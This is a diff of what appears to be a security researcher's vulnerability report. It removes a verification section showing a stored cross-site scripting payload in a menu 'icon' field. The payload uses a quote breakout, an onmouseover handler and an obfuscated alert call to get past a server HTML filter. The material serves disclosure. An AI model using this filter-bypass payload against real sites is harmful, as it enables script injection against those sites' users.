@@ -54,27 +54,6 @@ url=/gt48261022ic3
 
 Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.
 
-## Fresh verification evidence
-
-| Run | Marker | Observation | Result |
-| --- | --- | --- | --- |
-| 1 | `gt48261022ic1` | raw icon attribute payload | **PASS** |
-| 2 | `gt48261022ic2` | raw icon attribute payload | **PASS** |
-| 3 | `gt48261022ic3` | raw icon attribute payload | **PASS** |
-
-```text
-Saved menu/list JSON, run 3:
-{
-  "menuName": "gt48261022ic3",
-  "url": "/gt48261022ic3",
-  "icon": "gt48261022ic3\" onmouseover = self[\"al\"+\"ert\"](1) x=\""
-}
-
-The value contains no angle brackets, survives the server HTML filter, and
-breaks out of the existing class attribute in the formatter.
-```
-
-The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.
 
 ## Confirmed source and Sink
 
